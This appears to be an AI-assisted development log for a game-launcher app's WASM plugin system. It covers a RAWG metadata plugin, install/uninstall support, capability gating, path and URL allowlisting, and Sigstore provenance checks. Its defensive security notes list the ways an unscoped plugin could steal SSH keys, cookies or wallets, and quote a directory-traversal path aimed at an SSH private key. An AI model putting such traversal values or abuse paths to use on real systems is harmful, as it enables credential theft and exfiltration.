- **`Installable` generalization.** The Install-button component was still typed to `WrapperPlugin` specifically even though nothing about it (Found/Not-found status, an Install button, `install()`/`isInstalled()`) is actually wrapper-specific - any plugin kind that manages its own downloaded dependency could reuse it. Pulled `install()`/`isInstalled()` out into a standalone `Installable` interface (`src/plugins/types.ts`) any `PluginBase` can compose with (`WrapperPlugin extends PluginBase, Installable`), renamed `WrapperInstallStatus.vue` → `InstallableStatus.vue` (now typed to `PluginBase & Installable`, no wrapper knowledge at all), and added an `installable?: boolean` flag to `PluginManifest` so the loader can tell which plugins opt in without guessing from `kind`. `loader.ts` gained `attachInstallableStatus()`, called generically after loading any TS-authored plugin: if the manifest is tagged `installable`, the plugin didn't set its own `settingsComponent`, and it actually implements `install`/`isInstalled`, it gets the generic component for free - covers any future TS plugin of any kind. `createWasmWrapperPlugin` still sets its own `settingsComponent` explicitly (takes precedence over the generic fallback) since it needs an extra `onInstalled` hook to refresh `wrapperPlugins.profiles` after a fresh install - kept as an optional prop on the generic component itself (a caller-supplied callback, not baked-in wrapper knowledge) rather than special-casing it in `InstallableStatus.vue`.
  - Deliberately scoped to the TS/frontend layer only. The WASM/WIT side can't get the same "any kind, opt-in" treatment without real design work: a WIT world's exports are all-or-nothing, so adding `install`/`is-installed` to e.g. `source-plugin-world` would force every existing source plugin (`steam-wasm`, `gog-wasm`) to implement them just to keep instantiating. `wrapper-plugin-world` gets to have them because every wrapper plugin needs them; a true cross-kind opt-in for WASM plugins would need per-kind world variants, not attempted here since there's no second installable WASM kind yet to justify it
- **Uninstall.** `Installable` gained `uninstall()` alongside `install()`/`isInstalled()` - `InstallableStatus.vue`'s button is now a real toggle (Install ⇄ Uninstall) keyed off the current Found/Not-found state, rather than Install-only with no way back short of deleting files by hand. `wrapper-plugin`'s WIT `uninstall` export is trivial for both plugins (`host::remove-dir` on their own `install_dir()` - nothing else to clean up, no registry entries or other host-managed state to unwind). The `onInstalled` prop/hook was renamed `onInstallChanged` and now fires after either direction, so `wrapperPlugins.profiles` gets cleared out on uninstall too, not just repopulated on install. Verified for real against the actual live installs (not a temp dir): a temporary `#[test]` drove `uninstall()` against both already-installed plugins in `<app data>/wasm-plugins/`, confirmed `is_installed()` flips to `false` and the `install/` directory is actually gone, then was removed - both wrappers are left genuinely uninstalled afterward, a clean state for exercising the new toggle through the real UI

## Milestone 11 — RAWG Metadata Provider (stretch)
`proposal.md` names IGDB/SteamGridDB/RAWG as metadata sources; only the first two exist. Low-effort relative to when the proposal was written, since Milestone 7 already generalized metadata providers into a proper multi-enable plugin kind - this is just a new plugin against existing architecture, not new infrastructure.

Milestone written before the M9 SGDB/IGDB WASM migration (still described a built-in `rawg.rs` + `src/plugins/rawg/`) - updated to follow that precedent instead: a standalone `rawg-metadata-wasm-plugin` repo, same shape as the existing two (`metadata-plugin-world`, `http-request`, `settingsSchema` for the API key). Scaffolded directly off `igdb-metadata-wasm-plugin`'s files (same `wit/plugin.wit`, `.gitignore`, `.vscode/settings.json`, `publish.yml`) rather than re-deriving them. Text-only scoping (description/genres/release date, no art) matches IGDB's own reasoning - SteamGridDB stays the only art source.

RAWG's search endpoint doesn't return the full description - only `/api/games/{id}` has `description_raw` - so a lookup takes two requests: search (also carries `released`/`genres`, no second call needed for those) to resolve an id, then a detail fetch for the description text. `search_game`/`fetch_description` in `src/lib.rs`.

Real end-to-end testing (live API key) caught a genuine bug: searching "A Dance of Fire and Ice" returned the game's description with a completely unrelated "NOTE: Unity plugins will only work in Firefox/Safari/IE now..." browser-compatibility notice that doesn't appear on the actual game's RAWG page. Traced with a direct `curl` against RAWG's API (using the key already stored in the local `settings` table, read directly from `library.db` for debugging) rather than guessing: RAWG's search ranks by its own relevance score, not popularity/exactness, and for this query an obscure 2014 itch.io prototype ("A Dance of Fire and Ice (itch)", id 92339, 0 rating, 6 adds) outranks the real 2019 release (id 279033, rating 4.19, 407 adds) - `search_game`'s original `.next()` (first result) picked the prototype, whose own listing genuinely carries that stray note in its `description_raw`. Fixed by widening the search to 5 candidates (`page_size=5`) and preferring an exact case-insensitive `name` match over the raw relevance order, falling back to the first result only when nothing matches exactly - the real release's RAWG listing name is exactly "A Dance of Fire and Ice" with no suffix, so this reliably picks it. Confirmed via the same direct API check that id 279033's `description_raw` has no stray note. Considered `ordering=-added` as an alternative fix first but ruled it out after testing - RAWG's `ordering` param overrides search relevance entirely rather than combining with it, returning globally popular games unrelated to the query. Version bumped 0.1.0 → 0.1.1 (patch, bug fix, no manifest change)

This single-`fetch_metadata` design (and `search_game`/`fetch_description`, named above) was superseded shortly after by the metadata-plugin interface v2 redesign (`search-candidates`/`fetch-metadata-by-id`, 0.2.0) - see the Milestone 14.5 entry for the full multi-provider story (combined candidate picker, per-candidate thumbnails, exact-match filtering applied to IGDB/SteamGridDB too). Milestone closed out: merge-priority behavior against IGDB (first-non-null-wins in `enabledIds` order) was exercised for real throughout that work - both providers enabled simultaneously, live fetches against real games, and the exact tie-break mechanism confirmed directly when asked - rather than needing a dedicated one-off test.

## Milestone 12 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch)
`proposal.md` lists these alongside Epic/GOG as source-plugin candidates; never scheduled. Each needs its own research pass (install detection method, manifest/registry format, launch mechanism) before implementation - unlike Epic/GOG, none of these were investigated during Milestone 7.

## Milestone 13 — WASM Plugin Capability Sandboxing (security)
Opened directly out of Milestone 8's install-by-URL redesign (see that section) - writing the confirm dialog's warning copy forced an honest look at what the WASM sandbox actually protects against, and the answer was less than the "sandboxed" framing implied.

Checked `wasm_plugins.rs`'s real `Host` trait implementations, not just the WIT interface's doc comments. `do_read_file`/`do_write_file`/`do_remove_dir`/`do_list_dir`/`do_path_exists` are literally `std::fs::*` called on a caller-supplied path with no scoping at all - a plugin can read/write/delete anywhere the OS account can reach (SSH keys, browser cookie DBs, wallet files, arbitrary overwrites). `do_spawn_process`/`do_run_and_wait` run any executable path with any args - full arbitrary code execution, no allowlist. `do_read_registry_string`/`do_list_registry_keys` read arbitrary registry hives/paths. `http-get`/`download-bytes` let a plugin exfiltrate whatever it read or beacon out.

wasmtime's Component Model sandbox is real but narrower than it sounds: it guarantees memory safety (a plugin can't corrupt host memory or escape its own linear memory), not capability restriction. None of the host functions exposed through `wit/plugin.wit` are currently capability-scoped, so a syntactically valid, non-corrupt `.wasm` component that passes every sanity check (parses, loads, exports the right interface) can still do real damage simply by calling `spawn-process`/`write-file`/etc. with attacker-chosen arguments - the WASM boundary here is an ABI/portability boundary between host and guest, not a security boundary against a guest that's already trusted enough to be loaded. Net: today, installing a WASM plugin from an untrusted URL carries the same real-world risk as running an arbitrary downloaded `.exe`.

Two real mitigations identified, not yet implemented (tracked as open Milestone 13 items):
- **Path allowlisting** - scope the file/registry primitives to a plugin-declared directory allowlist (e.g. `plugin-dir()` plus whatever install paths a source plugin legitimately needs to scan) instead of accepting arbitrary absolute paths. This is real OS-level sandboxing, enforced host-side regardless of what the guest tries.
- **Permission gating on `spawn-process`/`run-and-wait`** - surface an explicit, visible "this plugin wants to run other programs" grant before install (mobile-app-permission-style) rather than silently allowing it. Doesn't stop a malicious plugin from calling it, but removes the silent part - nothing runs without the user having seen and agreed to that specific capability.

Both are real architecture changes (every existing plugin - Steam/GOG/Epic/LR/LE - relies on `spawn-process` and/or registry reads today), not a quick patch, so scoped as their own milestone rather than folded into Milestone 8's already-closed items. Explicitly out of scope even after both land: this closes "one malicious plugin can quietly own the whole machine," not a full app-store-grade trust model (no code signing, no review/moderation step, no revocation) - that would be a distinct, larger tier if ever wanted.

Interim, shipped this milestone: corrected `ConfirmInstallModal.vue`'s copy from implying real sandboxing to stating plainly that an installed plugin runs with the same access as any program on the system, and added the same caveat to the main README's plugin architecture section - so the UI/docs don't overclaim protection that doesn't exist yet.

**Permission gating for `spawn-process`/`run-and-wait`, implemented.** Picked over path allowlisting and URL allowlisting as the first of the three real mitigations, since it doesn't require solving path allowlisting's hard problem (Steam/GOG/Epic discover install locations at runtime via the registry, so they can't declare exact file paths in `plugin.json` ahead of time the way a capability tag can be declared) - checked which plugins actually call these two host functions first (`grep`, not assumed): Steam/GOG/Epic (launch) and LR/LE (installer + launch), all five. The three metadata providers never do.
- New `plugin_capability_grants` table (`plugin_id`, `capability`), added as a real new migration (v2) rather than amending the squashed v1 baseline again - `.claude/CLAUDE.md`'s schema rule ("new tables as a new migration, never edit a shipped migration in place") applies regardless of pre-1.0 status; the earlier squash was a one-time exception already spent, not an ongoing license. Deliberately its own table, not a `plugin:<id>:<key>` row in `settings` - a WASM guest's own `settings-get`/`settings-set` host functions can freely read/write any key under its own `plugin:<id>:` prefix, so a grant living in that same namespace would let a plugin just call `settings-set` on its own grant key and self-grant the very capability the table exists to gate. A guest has zero code path to `plugin_capability_grants` at all - only `has_capability` (host-side, `wasm_plugins.rs`) reads it, and only the frontend ever writes it
  - `PluginHostState::has_capability(capability)` queries the table directly using `self.plugin_id`/`self.db` (no guest-reachable path); `do_spawn_process`/`do_run_and_wait` both check it first and return an error string if ungranted, before doing anything else. Enforcement is host-side, not at the WASM Component Model import level - a component still imports the full `host` interface either way (WIT can't partially import one interface), the actual refusal happens inside the Rust function body
  - New Tauri commands `grant_plugin_capability`/`is_plugin_capability_granted` (`wasm_plugin_runtime.rs`) - simple one-off `rusqlite` queries against a fresh connection, no WASM instantiation needed for either
- `WasmPluginManifest`/`PluginPreview` (`plugin_installer.rs`) and the TS `PluginManifest`/`PluginPreview` (`manifest.ts`) gained `capabilities: string[]` (`#[serde(default)]`/optional) - an array, not a single bool, so a future second capability tag (e.g. one for the still-open path-allowlisting item) doesn't need another breaking manifest change. `RUN_PROGRAMS_CAPABILITY = "run-programs"` exported as the one constant value today
- Two UI surfaces, deliberately sharing the same underlying grant-write call rather than two different code paths: **new installs** (`ConfirmInstall.vue`) - if the fetched manifest declares `run-programs`, a checkbox appears ("This plugin runs other programs on your system... I understand and allow this"), Install stays disabled until checked, confirming writes the grant via `grant_plugin_capability` before the real install proceeds. **Already-installed plugins** (`PluginSettings.vue`, Source and Wrapper tabs) - any installed manifest declaring the capability without a recorded grant gets a "Permission needed" row with a Grant button. No silent grandfathering for plugins that predate this feature (Steam/GOG/Epic/LR/LE) - deliberately chosen over auto-granting them, since a silent grandfather clause would undercut the milestone's own "not silent" requirement; existing users click Grant once per plugin after upgrading, same one-time friction a brand-new install's checkbox already requires
- Declared `"capabilities": ["run-programs"]` in all five plugins that actually call these functions (confirmed via `grep`, not assumed) - `steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin` - each bumped `0.1.1` → `0.2.0` (minor: new capability declaration, backward compatible - an older Concourse build ignores the unknown manifest field and behaves exactly as before) and README'd with a `## Permissions` section. Steam and Epic's declarations are honestly noted as currently inert (their own READMEs already said `launch()` is dead code, since the host's own URI dispatch handles `steam://`/`com.epicgames.launcher://` directly) - declared anyway for forward-compatibility, since the WIT export exists and could become reachable later without a manifest change catching up to it then
- Main README's Milestone 13 security note updated from "planned but not implemented" to reflect the real, narrowed state: `spawn-process`/`run-and-wait` are gated now, file/registry/network access still isn't
- Follow-up, prompted by the user asking exactly which games actually launch through a WASM plugin's `spawn-process` (answer: only GOG and LR/LE for real - Steam/Epic launch via `openUrl()` on their own URIs, never touching the plugin's `launch()` at all, confirmed by reading `library.ts`'s actual dispatch): Steam's and Epic's `launch()` implementations weren't just unreachable, they were latently broken - both called `host::spawn-process(&entry.executable_path, ...)` where `executable_path` is literally the `steam://`/`com.epicgames.launcher://` URI string, which would fail immediately if ever invoked (a URI can't be spawned as a process, the exact "OS error 123" class of bug `launcher.rs` already had to work around for the host's own dispatch). Fixed both to return a documented error instead of calling `spawn-process` at all, and dropped their now-pointless `run-programs` capability declaration (`0.2.0` → `0.2.1`, patch) - they never legitimately call the gated function anymore, so there's nothing to grant
- Caught and fixed a real local dev-environment mistake while reinstalling these: an earlier `cp ... "$BASE/epic-wasm/"` step (during the original capability-declaration sync) collapsed into writing a flat file named `epic-wasm` directly under `wasm-plugins/source/` instead of a `epic-wasm/plugin.json` + `epic-wasm/<entry>.wasm` directory pair - same for `gog-wasm`. Both installed plugins were silently broken (no `.wasm` present at all) until caught by inspecting the actual directory listing rather than trusting the `cp` command's exit code; fixed by removing the flat files and recreating proper directories with both files copied in correctly
- **A second, more serious mistake**: reported by the user as "no themes show up" - the real symptom was much bigger (`Uncaught (in promise) migration 1 was previously applied but has been modified`), meaning the whole DB connection failed to initialize, taking every store's `init()` down with it (themes just happened to be the first thing the user checked). Root cause: when `db.rs`'s `migrations()` was restructured from a single `Migration` to a `vec![...]` of two, migration v1's `sql` raw-string literal got re-indented in the process (one extra nesting level) even though its actual SQL content never changed. `tauri-plugin-sql` hashes each migration's exact content against its own ledger of what already ran - a whitespace-only change is still "modified" as far as that hash is concerned, and it refuses to proceed past a mismatch entirely, which cascaded into `settings`/`games`/every plugin manifest never loading, not just data-theme ones. Exactly the failure mode `db.rs`'s own comment already warned about ("its `sql`/`version` must never change - editing one in place desyncs that ledger"), triggered by mechanical reformatting rather than an intentional schema edit. Fixed by restoring v1's `sql` string byte-for-byte from the commit before the restructuring (confirmed via `diff` against that commit, not just eyeballed), leaving v2 as the only actually-new content. No manual DB repair needed - the ledger check is a live comparison against the current `migrations()` list, not a persisted "broken" flag, so matching the code back up self-heals on next launch

**Path allowlisting for file/registry host primitives, implemented.** The hard part flagged when this milestone was first scoped - Steam/GOG/Epic discover install paths at runtime, so they can't declare exact paths in `plugin.json` the way a capability tag was declared for spawn-process - turned out to be much narrower once actually measured (`grep`, not assumed, across all three): GOG never calls `read-file`/`list-dir`/`path-exists` at all (registry-only - GOG Galaxy keeps everything as flat registry key/value pairs, one subkey per installed game, no VDF/JSON files to parse). Epic's scan directory (`%ProgramData%\Epic\EpicGamesLauncher\Data\Manifests`) is hardcoded, not runtime-discovered - the *game's* install folder is genuinely variable (user-changeable in Epic's own launcher), but that variable path is just a string field inside a manifest file, never itself passed to a host file-access function. Steam is the only plugin whose read paths are genuinely dynamic (install location and library folders vary by user, can span multiple drives).

This split the fix into three pieces of very different difficulty, discussed and confirmed with the user before implementing (rejected an "Alternative C" host-driven-discovery idea along the way - inverting control so the host does the file walking would mean reintroducing per-vendor parsing logic into the trusted host, exactly what Milestone 8's WASM migration moved *out*, and would break third-party extensibility since a future community plugin's vendor format wouldn't be known to the host ahead of time):
- `write-file`/`remove-dir` are now hard-confined to the plugin's own `plugin-dir()`, unconditionally, no manifest declaration or escape hatch - every current legitimate use (LR/LE only, confirmed via `grep`: every `write-file`/`remove-dir`/`read-file`/`path-exists` call in both derives from `host::plugin-dir()`) already lives there, so this closes the arbitrary-overwrite/delete risk with zero functional cost.
- Registry reads and Epic's static manifest directory share one mechanism: a new `pathScopes` array in `plugin.json` (`PathScope::Registry { hive, prefix }` / `PathScope::Path { prefix }`, `wasm_plugins.rs`), enforced host-side in `do_read_registry_string`/`do_list_registry_keys`/`do_read_file`/`do_list_dir`/`do_path_exists` via `is_allowed_registry`/`is_allowed_read_path`. Both check a lexically-normalized prefix match (`normalize_components`/`path_has_prefix` - resolves `.`/`..` without touching disk, so it works for paths that don't exist yet and can't be fooled by a `<scoped-dir>\..\..\Users\x\.ssh\id_rsa`-style traversal attempt) rather than `std::fs::canonicalize` (which needs the path to already exist and produces Windows' awkward `\\?\`-prefixed form). Steam declares its own fixed vendor registry keys (`Software\Valve\Steam`, `SOFTWARE\WOW6432Node\Valve\Steam`) plus its hardcoded fallback install path as a static `Path` scope too (`do_path_exists`'s pre-registry-check fallback needed it, would've silently started failing otherwise); GOG declares its four fixed vendor registry key prefixes (both bitness variants of `...\Games` and `...\GalaxyClient\paths`); Epic declares its one fixed manifests directory.
- Steam's genuinely dynamic library folders get a new host function, `request-read-scope(path)` (added to the shared `host` WIT interface, synced across all plugin repos - importing more functions than a guest actually uses is harmless for Component Model instantiation, so the other 7 plugins' already-compiled `.wasm` binaries didn't need rebuilding, just their `wit/plugin.wit` text kept in sync for future builds). Host-side (`do_request_read_scope`) only recognizes `"steam-wasm"` today, verified by checking for a real `steamapps` subdirectory under the requested path (Steam's own structural signature) before granting it for the rest of that instantiation (`dynamic_read_scopes`, in-memory only - fine since a fresh `PluginHostState` is created per Tauri command call anyway, and Steam's discovery-then-read all happens within one `scan()` call). Any plugin id without a registered validator is rejected outright with a clear error, not silently trusted and not given a real interactive user-approval prompt - discussed explicitly with the user and deferred, since no third-party plugin exists yet to actually exercise that fallback path; building speculative UI for zero current callers isn't worth it, noted here so it's a deliberate, revisitable choice, not a silent gap
- Steam's `find_steam_library_folders()` now calls `request-read-scope` on its resolved install path before reading `libraryfolders.vdf`, and again on every additional library folder path extracted from it before that folder's `steamapps` directory gets listed. Rebuilt all three (`steam-source-wasm-plugin`/`gog-source-wasm-plugin`/`epic-source-wasm-plugin`), bumped `0.2.x` → `0.3.0` (minor: new capability surface, backward compatible) - discovered along the way that Steam's and GOG's local `wit/plugin.wit` copies were badly stale (missing everything added since early Milestone 8 - `write-file`/`remove-dir`/`list-registry-keys`/`run-and-wait`/`http-request`/etc.), pre-existing drift unrelated to this change but fully re-synced while touching these two repos anyway, since a stale WIT file is a real documentation hazard for anyone rebuilding from source even though it never affected the already-compiled binaries
- No new frontend/UI work needed for this piece at all - unlike the `run-programs` capability gate, path scoping is fully host-enforced and silent-but-safe by design (a plugin either has a legitimate declared/verified scope or its call fails with a clear error), no install-time checkbox or Settings-panel grant button required

**URL allowlisting for `http-get`/`http-request`/`download-bytes`, implemented - Milestone 13 fully closed.** Measured real usage first (`grep`, same discipline as the path allowlisting piece) rather than assuming a general mechanism was needed: Steam/GOG/Epic make zero network calls at all, and every plugin that does (LR/LE, IGDB, SGDB, RAWG) only ever talks to a small, fixed set of hostnames known at author time. `download-bytes`'s target for LR/LE is a *dynamic string* (`asset.browser_download_url`, not a literal in source) but it's always a URL GitHub's own release API returned, never attacker-influenced input - so even the one "dynamic-looking" case reduces to a static host once you check where the string actually comes from. No plugin needed anything resembling Steam's verified-elevation mechanism from the previous item; a plain static allowlist covers 100% of real usage.
- New `plugin.json` field `httpScopes: string[]`, parsed into `PluginHostState.http_scopes`, checked by `is_allowed_host` (`wasm_plugins.rs`) before every `do_http_get`/`do_http_request`/`do_download_bytes` call. Parses the URL via `reqwest::Url` (already a transitive dependency, no new crate needed) and matches the host against each scope entry either exactly or as a subdomain suffix (`host.ends_with(".{scope}")`) - declaring `"github.com"` alone covers both `github.com` and `api.github.com` without listing every subdomain. Only the plugin-supplied entry URL is checked; whatever redirect chain the HTTP client follows internally afterward (e.g. GitHub's release-asset CDN) is out of scope, same as how this kind of check normally works everywhere else
- No WIT change needed this time (unlike `request-read-scope`) - `http-get`/`http-request`/`download-bytes`'s signatures are unchanged, only the host-side enforcement wrapping them changed, so no plugin repo needed a rebuild for the *mechanism* itself
- Declared `httpScopes` in the five plugins that actually make network calls, each bumped `0.2.0` → `0.3.0` (manifest-only change, no Rust source touched, so no rebuild needed for these five either - just the `plugin.json` itself): `locale-remulator-wasm-plugin`/`locale-emulator-wasm-plugin` → `["github.com"]`; `igdb-metadata-wasm-plugin` → `["id.twitch.tv", "api.igdb.com"]` (two unrelated domains, Twitch OAuth vs. IGDB's own API, declared separately since neither is a subdomain of the other); `sgdb-metadata-wasm-plugin` → `["steamgriddb.com"]`; `rawg-metadata-wasm-plugin` → `["api.rawg.io"]`. Steam/GOG/Epic get no `httpScopes` entry at all - correctly matches their real zero-network-calls behavior, no explicit empty array needed since `#[serde(default)]` already means "no scopes granted"
- Rejected the milestone wording's "rate-limiting" alternative outright once the real-usage data was in - it doesn't stop a plugin talking to an attacker's server, only slows down how often, which isn't the actual threat (exfiltration happening at all, not exfiltration happening *fast*). The allowlist is a real fix for the real risk; rate-limiting would have been security theater layered on top of an still-open hole

Milestone 13 is now fully closed - all four items (honest risk warning, path allowlisting, spawn-process/run-and-wait permission gating, URL allowlisting) done. Main README's security note updated to drop the "network access is unrestricted" caveat, replaced with the real remaining scope (nothing - every host-exposed capability that mattered is now gated, scoped, or requires an explicit grant).

**Follow-up, prompted by a genuinely important question**: "wouldn't this approach be dangerous in any circumstance?" Answered honestly rather than just restating what the mechanism does: `pathScopes`/`httpScopes` are entirely self-declared by the plugin's own `plugin.json` - unlike the `run-programs` capability grant (a real out-of-band step, the *user* has to click Grant), nothing stops a malicious plugin author from just declaring their own exfiltration server as an `httpScope` and having the check pass trivially. It only catches a plugin reaching *beyond* what it declared (scope creep, bugs, a compromised dependency), not a plugin that's malicious from the point of declaring its own manifest. That's a real, structural gap versus the capability-grant mechanism - and unlike that one, `pathScopes`/`httpScopes` were completely invisible to the user at install time, no equivalent of the `run-programs` checkbox existed for them at all.
- Fixed the visibility gap: `PluginPreview` (`plugin_installer.rs`) gained `path_scopes`/`http_scopes` fields (the `PathScope` enum gained `Serialize` alongside its existing `Deserialize` so it can round-trip to the frontend), populated in `fetch_plugin_preview` for source/metadata-kind previews (empty for themes, which have no scope concept). `ConfirmInstall.vue` now renders a "Declares access to:" list (registry keys, path prefixes, hostnames) alongside the existing risk-warning text and the `run-programs` checkbox - visibility only, explicitly not a new enforcement step (the host enforces `pathScopes`/`httpScopes` identically whether or not anyone reads this list). Rewrote the dialog's blanket "runs with the same file and network access as any program" copy too, since it was flatly wrong post-M13 (an undeclared-scope plugin now gets essentially nothing - no network at all, no files outside its own `plugin-dir()`) - replaced with an honest statement that access is scoped to what's declared below, but that declaration is self-reported by the plugin's own author, not verified against what the code actually does
- Doesn't change the underlying trust model at all - this is groundwork for a human (or, someday, tooling) to actually *look* at what a plugin claims before installing, not a new security boundary. Real authenticity verification (is this plugin's declared behavior actually what it does) is still Milestone 14's job, not this one's

## Milestone 14 — Plugin Trust Model: Signing & Review (stretch)
Follow-up question after scoping Milestone 13: does capability sandboxing alone answer "should I trust this plugin at all," and separately, does the WASM choice itself get undermined by any of this? Recap of Milestone 8's actual reasoning first, since that was worth re-checking before adding more scope on top of it - WASM was picked specifically to avoid native dylib loading (`libloading`), which would have meant unsandboxed, unbounded arbitrary code execution with no enumerable capability surface at all. Even with Milestone 13 still open, WASM already delivers on that: memory safety is real (a plugin can't corrupt host memory or make arbitrary syscalls), and the full set of things a plugin could possibly do is the finite, auditable list in `wit/plugin.wit` - a native dylib would have had none of that. Milestone 13's gap (those enumerated functions being currently unscoped) is a defense-in-depth layer on top of a still-sound original decision, not evidence the decision was wrong. Milestone 14 is a third, further layer again - it doesn't answer "what can a plugin technically do" (that's Milestone 13), it answers "should this specific plugin be trusted to run at all," which capability sandboxing can never answer on its own.

Prompted by a real, concrete question: GitHub computes and shows a SHA256 digest for every release asset - is that useful here? Worth being precise about what it actually proves. It's an **integrity** guarantee (the bytes weren't corrupted or tampered with in transit) - it is not an **authenticity** guarantee, because the hash is served by the same channel/account as the artifact itself. If a repo or account is compromised and a malicious release goes up, GitHub computes an equally legitimate-looking hash for that malicious file too - the hash and the artifact share a trust root, so it can't vouch for that root. That's exactly what real code signing (a private key held independently of the hosting channel, verified against a public key the client already trusts) is for, and a self-reported GitHub digest doesn't substitute for it.

That said, a cheap design does fall out of it: a separate whitelist repo/wiki, maintained by hand, listing `{plugin id, version, manifest URL, expected sha256}` - the app would check a downloaded plugin's actual hash against the *pinned* value in that separate registry, not against whatever hash the plugin's own release currently self-reports. This collapses two of the three Milestone 14 bullets into one lightweight, actually-buildable piece: it's a real curated registry (an entry only exists because someone reviewed and pinned it), and revocation comes for free (pulling or flagging a bad entry there *is* revocation - no separate mechanism needed). It does not give the signing bullet - the trust root becomes "whoever has write access to the whitelist repo" rather than a cryptographic identity, which is a legitimate, much simpler trust model appropriate for a personal-scale project, just not equivalent to real PKI-based code signing. Left Milestone 14's three bullets as-is rather than rewriting them around this - the whitelist repo is one possible future implementation of two of the three, not a redefinition of the milestone itself.

**Follow-up: the signing bullet isn't actually the heavy one either.** A second real, concrete question - "wasn't there a free option to get artifacts code-signed through GitHub Actions?" - turned up GitHub Artifact Attestations (`actions/attest-build-provenance`, GA since June 2024). Free for public repos (every plugin repo is public), it uses Sigstore's public-good instance: a short-lived signing certificate gets issued bound to the GitHub Actions OIDC token for that specific run (repo + workflow + commit), the artifact gets signed with it, and the signed attestation is written to Rekor - a public, append-only transparency log independent of the repo/account itself. This is the missing piece from the SHA256 discussion above: the trust root moves from "whoever controls the repo/hosting channel" to Sigstore's transparency log, so a compromised repo account can't retroactively forge a legitimate-looking attestation for a malicious release the way it can for a self-reported hash. Verification is a single command, `gh attestation verify <file> --repo <owner>/<repo>`.

Net effect on Milestone 14: the signing bullet goes from "distinct, heavier tier, unlikely to be worth building" to "one extra CI step (`actions/attest-build-provenance`) plus one verify call in the app's install flow (`fetch_wasm_plugin_manifest`/`install_wasm_plugin` in `wasm_plugin_installer.rs` would be the natural place)." Not wired in yet - documented in `milestones.md`'s Milestone 14 note as the concrete answer, held off on implementation per explicit instruction to update the note first and wire it in later.

**Signing, implemented.** Picked up directly after M13 closed. Before building anything, the user asked the exact right question first: "how can I tell if a repo author is malicious so he wrote malicious code inside wasm and signed it?" Worth being honest about the answer rather than glossing past it - signing proves **provenance/integrity** ("this artifact really is what that repo's CI produced from that commit, unmodified since"), not **trustworthiness**. A repo owner who writes malicious code from day one gets a perfectly valid attestation for it - their own CI genuinely built and signed exactly what they committed, Sigstore has no opinion on intent. What signing actually stops is a *different*, narrower class of attack: tampering after the fact (a compromised CDN, a stolen release token pushing an asset that never went through the real commit-and-build flow, a hijacked repo slipping in a rogue release). Answering "is this author trustworthy" is the milestone's *other* two bullets (curated registry, revocation), not this one - built anyway since it's real, narrower value, not a substitute for those.

- **Dependency research, the hard way.** First candidate, `sigstore-verification` (jdx), had exactly the convenience API wanted (`verify_github_attestation(path, owner, repo, ...)`) - but a direct GitHub API check (not just a scraped page, which claimed the same thing and could have been a hallucination) confirmed it was archived days earlier, mid-release (issue for v0.2.9 still open). Depending on an abandoned crate for cryptographic verification was rejected outright regardless of why it was archived - no future patches if Sigstore's bundle format or GitHub's API shape changes. Found the real answer instead: `sigstore/sigstore-rust` (official Sigstore org, pushed the day before this work, split into focused crates - `sigstore-verify`, `sigstore-trust-root`, `sigstore-bundle`, `sigstore-types`). Lower-level than the archived convenience wrapper (no GitHub-specific one-call function), so the actual GitHub-attestation flow had to be built out of primitives, but on a maintained, official foundation instead of an abandoned side project
- **Exact API confirmed by reading the real crate source** (`~/.cargo/registry/src/.../sigstore-verify-0.1.1/src/verify.rs`) rather than trusting scraped docs.rs summaries again, which had already been unreliable twice in this same research pass (one page hallucinated missing param types, another apparently missed the `bundle` field GitHub's own OpenAPI schema clearly has). `TrustedRoot::production()` turned out to be fully embedded (`include_str!` of a bundled `trusted_root.json`) - no live TUF fetch needed for the trust root at all, only the attestation bundle itself needs a real network call (to GitHub's own API, unavoidable). GitHub's authoritative OpenAPI spec (`github/rest-api-description`) confirmed the exact response shape (`attestations[].bundle`, matching `sigstore_types::Bundle`'s JSON shape directly - `mediaType`/`verificationMaterial`/flattened DSSE content)
- **A real, separate toolchain gap surfaced along the way**: `aws-lc-sys` (pulled in transitively for the crypto backend) needs NASM installed on Windows, and none of `scoop`/`choco`/`winget` actually got it working from this Bash-tool session - `winget install` reported success but the package never registered (likely tied to a known-broken Windows user profile on this machine), `choco` needed admin elevation this session didn't have. Worked around entirely by downloading NASM's own portable zip and prepending it to `PATH` for the build session - no system install needed at all. Separately, PowerShell resolves Windows-native tool paths more reliably than this session's Git-Bash/MSYS shell for anything spawning native `.exe`s (confirmed earlier in the SSH-signing saga too) - used PowerShell for every Rust build from this point on
- **New host module** `plugin_verification.rs` (not a separate crate/repo - discussed explicitly with the user first: this is core, always-trusted host infrastructure with exactly one caller and no reuse case, unlike WASM plugins' own separate-repo pattern, which exists specifically to prove the "install arbitrary third-party code" model holds). `parse_github_owner_repo(url)` extracts `{owner, repo}` from a `github.com` manifest URL; `verify_plugin_provenance(bytes, owner, repo)` computes the artifact's SHA256, fetches `GET /repos/{owner}/{repo}/attestations/sha256:{digest}`, parses out the bundle, and calls `sigstore_verify::verify_with_trusted_root` with a policy requiring `issuer = https://token.actions.githubusercontent.com` and `identity = https://github.com/{owner}/{repo}/.github/workflows/publish.yml@refs/heads/main` - hardcoded to match every one of this project's own plugin repos' actual `publish.yml` convention (workflow literally named `publish.yml`, triggered on push to `main`); a repo using a different filename/branch would need this updated, no generic way to discover that
- **Advisory, not enforced, deliberately** - `install_wasm_plugin` (`plugin_installer.rs`) attempts verification and returns the outcome (`InstallResult { id, verified, verification_note }`) but never blocks the install on failure. Hard-rejecting wasn't viable yet: not one single existing plugin release predates this feature, so every currently-published release would fail verification (no attestation exists for it) and every install-by-URL would break until each repo's CI ships a new signed release. `pluginInstall.ts` toasts the outcome after install completes rather than showing it in `ConfirmInstall.vue` up front like `pathScopes`/`httpScopes` were - verification needs the actual downloaded `.wasm` bytes to hash, which `fetch_plugin_preview` deliberately never downloads (stays a lightweight manifest-only fetch), so there's no point before install exists to check it at
- **A real regression from the *previous* milestone item caught along the way**: running the actual test suite (`cargo test`, not just `cargo check --tests` which only type-checks) for the first time since the M13 path-allowlisting work revealed the reference `exe-scanner-plugin` end-to-end test had been silently broken - its fixture manifest declared no `pathScopes`, so its legitimate scan of a directory outside its own `plugin-dir()` (a stand-in for a real "user-configured scan folder" pattern) now correctly got rejected. Fixed by having the test declare a `pathScopes` entry for its own temp scan directory, same as a real plugin author would - not a workaround, the test fixture was simply out of date with the enforcement it was supposed to be exercising. A good reminder that `cargo check` isn't a substitute for `cargo test` even when nothing was consciously being changed in that area
